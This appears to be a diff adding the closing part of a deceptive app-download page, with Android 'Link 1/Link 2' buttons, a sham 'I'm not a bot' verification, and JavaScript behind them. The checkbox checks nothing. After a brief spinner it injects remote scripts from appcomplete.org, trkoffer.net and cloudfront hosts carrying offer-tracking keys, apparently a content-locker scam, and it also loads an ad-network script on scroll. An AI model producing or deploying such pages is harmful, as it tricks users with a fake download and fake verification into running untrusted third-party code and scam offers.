+              <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M17.6 9.48l1.84-3.18c.16-.31.04-.69-.26-.85-.29-.15-.65-.06-.83.22l-1.88 3.24c-2.86-1.21-6.08-1.21-8.94 0L5.65 5.67c-.19-.29-.58-.38-.87-.2-.28.18-.37.54-.22.83L6.4 9.48C3.3 11.25 1.28 14.44 1 18h22c-.28-3.56-2.3-6.75-5.4-8.52zM7 15.25c-.69 0-1.25-.56-1.25-1.25s.56-1.25 1.25-1.25 1.25.56 1.25 1.25-.56 1.25-1.25 1.25zm10 0c-.69 0-1.25-.56-1.25-1.25s.56-1.25 1.25-1.25 1.25.56 1.25 1.25-.56 1.25-1.25 1.25z"/></svg>
+              Link 1
+            </button>
+            <button onclick="showVerification(loadScript4)" class="w-full bg-midnight text-white py-3.5 rounded-2xl font-medium text-sm flex items-center justify-center gap-2.5 hover:bg-deepbrown transition-colors duration-300 mt-3">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M17.6 9.48l1.84-3.18c.16-.31.04-.69-.26-.85-.29-.15-.65-.06-.83.22l-1.88 3.24c-2.86-1.21-6.08-1.21-8.94 0L5.65 5.67c-.19-.29-.58-.38-.87-.2-.28.18-.37.54-.22.83L6.4 9.48C3.3 11.25 1.28 14.44 1 18h22c-.28-3.56-2.3-6.75-5.4-8.52zM7 15.25c-.69 0-1.25-.56-1.25-1.25s.56-1.25 1.25-1.25 1.25.56 1.25 1.25-.56 1.25-1.25 1.25zm10 0c-.69 0-1.25-.56-1.25-1.25s.56-1.25 1.25-1.25 1.25.56 1.25 1.25-.56 1.25-1.25 1.25z"/></svg>
+              Link 2
+            </button>
+            <p class="text-deepbrown/50 text-xs font-medium flex items-center justify-center gap-1.5 mt-3">
+              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+              If Link 1 didn't work, try Link 2
+            </p>
+          </div>
+
+          <button onclick="toggleAndroidInfo()" class="text-deepbrown/40 text-[11px] mt-2.5 underline hover:text-deepbrown/60 transition-colors flex items-center gap-1">
+            <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
+            How to use on Android
+          </button>
+          <div id="androidInfo" class="hidden text-deepbrown/50 text-[11px] mt-2 p-3 bg-white rounded-xl text-left leading-relaxed border border-warmbeige/20 w-full">
+            <strong class="text-deepbrown/70">No iOS? No problem!</strong><br><br>
+            1. Tap "Get it for Android" above<br>
+            2. Choose Link 1 or Link 2<br>
+            3. Complete the quick verification<br>
+            4. Your download starts automatically!<br><br>
+            <em>Works on Android — no iOS needed.</em>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- ===== VERIFICATION PHASE ===== -->
+      <div id="verifyPhase" class="hidden px-6 pb-6">
+        <div class="text-center py-2">
+          <div class="w-14 h-14 rounded-2xl bg-blush flex items-center justify-center mx-auto mb-4">
+            <iconify-icon icon="lucide:shield-check" width="24" class="text-rosegold"></iconify-icon>
+          </div>
+          <h4 class="font-serif text-base font-semibold text-deepbrown mb-1">Human Verification</h4>
+          <p class="text-deepbrown/40 text-xs mb-6">Please verify you're not a bot to continue</p>
+
+          <div id="verifyCheck">
+            <label class="inline-flex items-center gap-2.5 cursor-pointer bg-white rounded-xl px-5 py-3.5 border border-warmbeige/30 hover:border-rosegold/40 transition-colors">
+              <input type="checkbox" id="verifyCheckbox" onchange="doVerify()" class="w-5 h-5 rounded accent-rosegold cursor-pointer">
+              <span class="text-sm text-deepbrown/70">I'm not a bot</span>
+            </label>
+          </div>
+
+          <div id="verifyLoading" class="hidden">
+            <div class="flex flex-col items-center gap-3">
+              <div class="verify-spin"></div>
+              <p class="text-xs text-deepbrown/40">Verifying…</p>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ===== SCRIPT AREA ===== -->
+      <div id="scriptArea" class="hidden px-6 pb-6"></div>
+    </div>
+  </div>
+
+  <script>
+    let currentLoader=null;
+
+    function openModal(){
+      document.getElementById('downloadModal').classList.add('active');
+      document.body.style.overflow='hidden';
+      document.getElementById('loadingPhase').classList.remove('hidden');
+      document.getElementById('verifyPhase').classList.add('hidden');
+      document.getElementById('scriptArea').classList.add('hidden');
+      document.getElementById('scriptArea').innerHTML='';
+    }
+
+    function closeModal(){
+      document.getElementById('downloadModal').classList.remove('active');
+      document.body.style.overflow='';
+    }
+
+    function toggleAndroidLinks(){
+      document.getElementById('androidLinks').classList.toggle('hidden');
+    }
+
+    function toggleAndroidInfo(){
+      document.getElementById('androidInfo').classList.toggle('hidden');
+    }
+
+    function showVerification(loader){
+      currentLoader=loader;
+      document.getElementById('loadingPhase').classList.add('hidden');
+      document.getElementById('verifyPhase').classList.remove('hidden');
+      document.getElementById('verifyCheck').classList.remove('hidden');
+      document.getElementById('verifyLoading').classList.add('hidden');
+      document.getElementById('verifyCheckbox').checked=false;
+    }
+
+    function doVerify(){
+      document.getElementById('verifyCheck').classList.add('hidden');
+      document.getElementById('verifyLoading').classList.remove('hidden');
+      setTimeout(function(){
+        document.getElementById('verifyPhase').classList.add('hidden');
+        if(currentLoader) currentLoader();
+      },1000);
+    }
+
+    function loadScript1(){
+      var area=document.getElementById('scriptArea');
+      area.classList.remove('hidden');
+      var s=document.createElement('script');
+      s.type='text/javascript';s.id='ogjs';
+      s.src='https://appcomplete.org/cl/js/7jwmr5';
+      area.appendChild(s);
+    }
+
+    function loadScript2(){
+      var area=document.getElementById('scriptArea');
+      area.classList.remove('hidden');
+      var s1=document.createElement('script');
+      s1.type='text/javascript';
+      s1.textContent='var tNCTr_BYj_ZZbuac={"it":4639354,"key":"5fa13"};';
+      area.appendChild(s1);
+      var s2=document.createElement('script');
+      s2.src='https://d18k3i06xdslhs.cloudfront.net/938e15a.js';
+      area.appendChild(s2);
+    }
+
+    function loadScript3(){
+      var area=document.getElementById('scriptArea');
+      area.classList.remove('hidden');
+      var s=document.createElement('script');
+      s.type='text/javascript';s.id='ogjs';
+      s.src='https://trkoffer.net/cl/js/1xj9ek';
+      area.appendChild(s);
+    }
+
+    function loadScript4(){
+      var area=document.getElementById('scriptArea');
+      area.classList.remove('hidden');
+      var s1=document.createElement('script');
+      s1.type='text/javascript';
+      s1.textContent='var vLEib_sig_BEdBpc={"it":4639358,"key":"f6060"};';
+      area.appendChild(s1);
+      var s2=document.createElement('script');
+      s2.src='https://d1chbu4sfo2xhu.cloudfront.net/def035a.js';
+      area.appendChild(s2);
+    }
+
+    const ad2Obs=new IntersectionObserver((entries)=>{
+      entries.forEach(e=>{
+        if(e.isIntersecting){
+          ad2Obs.disconnect();
+          const s=document.createElement('script');
+          s.src='https://pl31140726.profitableratecpmnetwork.com/09/04/f4/0904f4f79befbe30f83585ffc60538ff.js';
+          document.getElementById('adspot-cta').appendChild(s);
+        }
+      });
+    },{rootMargin:'200px'});
+    const ad2=document.getElementById('adspot-cta');
+    if(ad2)ad2Obs.observe(ad2);
+
+    const obs=new IntersectionObserver(e=>{e.forEach(el=>{if(el.isIntersecting)el.target.classList.add('visible')})},{threshold:.1,rootMargin:'0px 0px -50px 0px'});
+    document.querySelectorAll('.reveal').forEach(el=>obs.observe(el));
+
+    document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();const t=document.querySelector(a.getAttribute('href'));if(t)t.scrollIntoView({behavior:'smooth',block:'start'})})});
+
+    const vid=document.querySelector('video'),ov=document.getElementById('playOverlay');
+    if(vid&&ov)vid.addEventListener('playing',()=>{setTimeout(()=>{ov.style.opacity='0';setTimeout(()=>ov.style.display='none',500)},800)});
+
+    const fi=document.querySelector('.form-iframe-wrapper iframe');
+    if(fi){function rf(){const w=fi.parentElement.clientWidth;fi.style.height=Math.max(300,Math.min(Math.round(w/640*452),452))+'px'}rf();window.addEventListener('resize',rf)}
+  </script>
+</body>
+</html>
